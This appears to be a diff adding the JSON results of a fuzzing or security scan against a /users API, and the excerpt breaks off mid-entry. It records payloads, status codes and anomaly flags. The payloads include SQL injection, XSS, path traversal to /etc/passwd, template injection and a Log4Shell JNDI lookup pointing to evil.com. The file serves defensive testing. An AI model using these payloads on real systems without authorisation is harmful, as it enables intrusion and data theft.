@@ -1,0 +1,704 @@
+[
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "' OR '1'='1",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.401075
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "<script>alert('XSS')</script>",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.319424
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "../../../etc/passwd",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.320082
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "status_code": 403,
+    "response_length": 4547,
+    "response_time": 0.030722,
+    "anomaly": true
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "{{7*7}}",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.309174
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.321035
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "\u0000\u0001\u0002\u0003",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.314636
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "\ud83d\ude80\ud83d\udd25\ud83d\udca5",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.324233
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "name",
+    "payload": "' OR '1'='1",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.31475
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "name",
+    "payload": "<script>alert('XSS')</script>",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.319796
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "name",
+    "payload": "../../../etc/passwd",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.319208
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "name",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "status_code": 403,
+    "response_length": 4547,
+    "response_time": 0.03171,
+    "anomaly": true
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "name",
+    "payload": "{{7*7}}",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.319311
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "name",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.308577
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "name",
+    "payload": "\u0000\u0001\u0002\u0003",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.321914
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "name",
+    "payload": "\ud83d\ude80\ud83d\udd25\ud83d\udca5",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.317008
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "email",
+    "payload": "' OR '1'='1",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.308576
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "email",
+    "payload": "<script>alert('XSS')</script>",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.317748
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "email",
+    "payload": "../../../etc/passwd",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.308823
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "email",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "status_code": 403,
+    "response_length": 4547,
+    "response_time": 0.031019,
+    "anomaly": true
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "email",
+    "payload": "{{7*7}}",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.320708
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "email",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.312286
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "email",
+    "payload": "\u0000\u0001\u0002\u0003",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.313882
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "email",
+    "payload": "\ud83d\ude80\ud83d\udd25\ud83d\udca5",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.316131
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "search",
+    "payload": "' OR '1'='1",
+    "status_code": 200,
+    "response_length": 5645,
+    "response_time": 0.307121
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "search",
+    "payload": "<script>alert('XSS')</script>",
+    "status_code": 200,
+    "response_length": 5645,
+    "response_time": 0.313591
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "search",
+    "payload": "../../../etc/passwd",
+    "status_code": 200,
+    "response_length": 5645,
+    "response_time": 0.317435
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "search",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "status_code": 403,
+    "response_length": 4547,
+    "response_time": 0.030824,
+    "anomaly": true
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "search",
+    "payload": "{{7*7}}",
+    "status_code": 200,
+    "response_length": 5645,
+    "response_time": 0.313182
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "search",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status_code": 200,
+    "response_length": 5645,
+    "response_time": 0.318059
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "search",
+    "payload": "\u0000\u0001\u0002\u0003",
+    "status_code": 200,
+    "response_length": 5645,
+    "response_time": 0.320516
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "search",
+    "payload": "\ud83d\ude80\ud83d\udd25\ud83d\udca5",
+    "status_code": 200,
+    "response_length": 5645,
+    "response_time": 0.314484
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "name",
+    "payload": "' OR '1'='1",
+    "status_code": 201,
+    "response_length": 70,
+    "response_time": 0.32417,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "name",
+    "payload": "<script>alert('XSS')</script>",
+    "status_code": 201,
+    "response_length": 88,
+    "response_time": 0.307672,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "name",
+    "payload": "../../../etc/passwd",
+    "status_code": 201,
+    "response_length": 78,
+    "response_time": 0.30676,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "name",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "status_code": 201,
+    "response_length": 84,
+    "response_time": 0.128247,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "name",
+    "payload": "{{7*7}}",
+    "status_code": 201,
+    "response_length": 66,
+    "response_time": 0.127666,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "name",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status_code": 201,
+    "response_length": 1059,
+    "response_time": 0.142776,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "name",
+    "payload": "\u0000\u0001\u0002\u0003",
+    "status_code": 201,
+    "response_length": 83,
+    "response_time": 0.3166
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "name",
+    "payload": "\ud83d\ude80\ud83d\udd25\ud83d\udca5",
+    "status_code": 201,
+    "response_length": 62,
+    "response_time": 0.125857,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "username",
+    "payload": "' OR '1'='1",
+    "status_code": 201,
+    "response_length": 74,
+    "response_time": 0.129688,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "username",
+    "payload": "<script>alert('XSS')</script>",
+    "status_code": 201,
+    "response_length": 92,
+    "response_time": 0.127769,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "username",
+    "payload": "../../../etc/passwd",
+    "status_code": 201,
+    "response_length": 82,
+    "response_time": 0.12467,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "username",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "status_code": 201,
+    "response_length": 88,
+    "response_time": 0.126247,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "username",
+    "payload": "{{7*7}}",
+    "status_code": 201,
+    "response_length": 70,
+    "response_time": 0.129018,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "username",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status_code": 201,
+    "response_length": 1063,
+    "response_time": 0.12455,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "username",
+    "payload": "\u0000\u0001\u0002\u0003",
+    "status_code": 201,
+    "response_length": 87,
+    "response_time": 0.12645
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "username",
+    "payload": "\ud83d\ude80\ud83d\udd25\ud83d\udca5",
+    "status_code": 201,
+    "response_length": 66,
+    "response_time": 0.129866,
+    "anomaly": true
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "email",
+    "payload": "' OR '1'='1",
+    "status_code": 201,
+    "response_length": 45,
+    "response_time": 0.128569
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "email",
+    "payload": "<script>alert('XSS')</script>",
+    "status_code": 201,
+    "response_length": 45,
+    "response_time": 0.12278
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "email",
+    "payload": "../../../etc/passwd",
+    "status_code": 201,
+    "response_length": 45,
+    "response_time": 0.127117
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "email",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "status_code": 201,
+    "response_length": 45,
+    "response_time": 0.124463
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "email",
+    "payload": "{{7*7}}",
+    "status_code": 201,
+    "response_length": 45,
+    "response_time": 0.128038
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "email",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status_code": 201,
+    "response_length": 45,
+    "response_time": 0.125038
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "email",
+    "payload": "\u0000\u0001\u0002\u0003",
+    "status_code": 201,
+    "response_length": 45,
+    "response_time": 0.125026
+  },
+  {
+    "type": "json_data",
+    "endpoint": "/users",
+    "field": "email",
+    "payload": "\ud83d\ude80\ud83d\udd25\ud83d\udca5",
+    "status_code": 201,
+    "response_length": 45,
+    "response_time": 0.128079
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": ";I@g=}yfBM&fgz{iCkuz^?DaI?r<G1#K[<M.MKV._MV][Hw-zoQ]DR:waj?vah=wfVDs9#>{2gMv8-:y&.VcHFUxtlvIVM-:DHV$u{r2Ww4qs5jhw@1Q}(a|U^5ukHN_taYi>J=ds{xJU^4X;O@ZrhA?C}Yy(ORCg8.D[)ZDuyz)9pL8(JPav{#vObu*q:Yw;D7,E>ek4,LznchGJn$6[}!6bkGrx$yw+Wx*6KzaL5?&*Xe73H>%X}yvxOo.=#O!VATVzk}K}f4h3kcubj[o8MA%eOr2yHco|kmX;ggqXAf0]",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.320358
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "@|2r!Nxv&]UVpr@>B79u1QA}|W:+H-6QWSgCjZ5av@]@4jhcFnS7>hpLQTkC5C*(2%9C#Fq!gZ=m(|@|kn_@A:vV(J=:?o,V5eguV7xp3D.#X_-1;v|nt|=;[8F9e=<O9!U&32C+XmJTo8.l,G2b8.*l*Ahe,g+v.7llMl+@)&.wO=b#,HenUtb?5<BIQK&k3*X9+;392$)yo1gsqmo3FIN(4C!]:XS:czpdb*j@HP%|,=ZarQi|48;z9kS|CfYZQrO3tJ(yb8exlnojrd5P*17eI{xDM>x><f7O$UD+cfI%W]k#*2@)sI+gm$(i{-rHB{Yc4>!ldUpSvaT4<4g$gB?@j).(qha1l>uLS(5.QmM2Y58K3aPW,l_4W|4hzZr]$xw-1WCl]KpltrG[RM0=G1gOV?lWrC$lI4tO>:kWKOW|hU$6hkwmsW39zc-9V6PR2rKs1DXQ25Am[Sz_48f=x8[|V}L>;+}nd=w4QW?ae7o;;xM9>Z#+N>E55jW-qXW,e,(]3$E!;Pd*(1=tg+!Zd+RDi!%Cq]wwtDZ!]rj>tQ5r81TV$8a4shV=IH(#yeclWj.0T-hda:^>5PQpE2?)fFZN}9_4BMcE.Vb$N}]S04d4y)ZE.)>u^I-+q|EW45Rq?DBf^ocmG?uN<t2t@:BZ-F,8akp{o5@ZcGkt8+Z+{,tv+n#U2<f^Bb+v1EG|t<>qnf?kA-&f#:3i49=0od1@[wg0WkLn=$H2.)jINhpL]:zZGfZDQ?+ade>>k8Y92+q,p[abI>BybBE(C9P+)1Qtv!}ulVno4lO+B!+2VofDsl=)[%<I.!JjjhVC)3Lp@py7c,S_^P%uqj2@j!0[0VRt.()dR%K:!t:9N0ZY3wWhdt,U(",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.313593
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "yxV3XMEw)?Afcspif[O:Tch0:NjGiTx9)W&any#dq$+99;mi@9#}7Z76,I35I^aGLY*Bp.JEp2tV#OgZ$9k9VE(kD}]FUV;?@Yps&ICJb!>>xHdqecFw%=Kb<Ao$tkUc9>za3uvcw9Sn4sYb2#u*7eNSEC+awX+NhV_;9=$+MrF2__S>m$YEQhT^Dw6wD&ehPKjS00]Z=C{mlaWi=Z:zYFG)a.>TpTnb.pSG(1oPkd8r:5DV=^tS$qO*cjM*S7OuzODvFK]7ThJWngufIKvQgXzN@rM&0!itV]Bq:LFK|GCUEEBZ4k=o9{$hTLf0|tQ#PUQr%mZb&y!$47]yNCHrp-ie*h",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.32648
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
